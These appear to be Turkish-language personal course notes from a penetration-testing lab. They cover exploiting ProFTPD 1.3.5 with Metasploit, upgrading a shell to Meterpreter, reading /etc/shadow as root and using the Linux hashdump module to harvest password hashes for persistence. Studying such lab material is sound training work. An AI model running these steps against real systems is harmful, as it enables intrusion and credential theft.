#blowfish

$1
$2
$5
$6


### Farklı sistemler farklı hash sistemleri kullanabilirler fakat modern olanlar genellikle #SHA-512 kullanırlar

---

## Exploit

## Kendi kalimizden nmap çalıştırdık.
### FTP server Proftpd 1.3.5 versiyonu olduğunu gördük ve bunu msfconsole da aratıyoruz.

#### Bunu Youtube'dan izle EVASION teknıklerıyle beraber

---

## Biz normal Meterpreter shell aldık zaten varolan payload ile
![[Pasted image 20240213151210.png]]
### Root olduk devam ediyoruz.
## Root olduk hashler hala neden lazım. İçeri girdiğimiz vuln'u yamarlarsa bir çuval incir berbat olur. HASH'ler Credentials'lar candır can

---

### Şimdi Burada Derste önemli bir durum var.
#normal-shell-to-meterpreter
#shell-to-meterpreter 
### Normal Session'u meterpreter session'a dönüştürmek önemli.
![[Pasted image 20240213151853.png]]

## CTRL + Z
### msfconsole 'u background'a aldık

## #session-upgrade
#normal-shell-meterpreter-yükseltme

### session -l
### session -u 1
## Bu komut session'u upgrade yapacak
![[Pasted image 20240213152337.png]]
![[Pasted image 20240213153123.png]]

#### YAPTIĞIMIZ PAYLOAD EĞER X64 İSE SHELL KARŞI SİSTEM DE ÖYLE OLMAK ZORUNDA. BİR ŞEKİLDE SHELL ALSAN BİLE İLERİKİ İŞLEMLER DE SORUN ÇIKIYOR.

### ctrl+ Z Yaptık ---- sessions -l  ---- buradan
## sessions -u yaptık ve bize meterpreter shell sağladı bunu listeye attı
### Tekrar sessions -l
## sessions 4 dedik ve meterpreter shell karşınızda

#shell-upgrade-meterpreter


#meterpreter-shell-kill-kapatma

## msf6> sessions -k 4
sessions kill 4 numaralı olanı


---

![[Pasted image 20240213153521.png]]

### cat /etc/shadow
![[Pasted image 20240213153703.png]]

## SHA 512 #SHA-512 
![[Pasted image 20240213153801.png]]
## $6

---

## HASHDUMP MODULE
### Session'ı geri alıp CTRL + Z ile burada search hashdump'ı arattık
![[Pasted image 20240213154028.png]]
## linux hashdump module'yi arıyoruz.
![[Pasted image 20240213154221.png]]
## post/linux//gather/hashdump

msf6 > use 0
msf6> options
msf6> set session 6

>[!warning] Bu modülün çalışması için root olarak meterpretershell olması gerekiyor. 

![[Pasted image 20240213154951.png]]






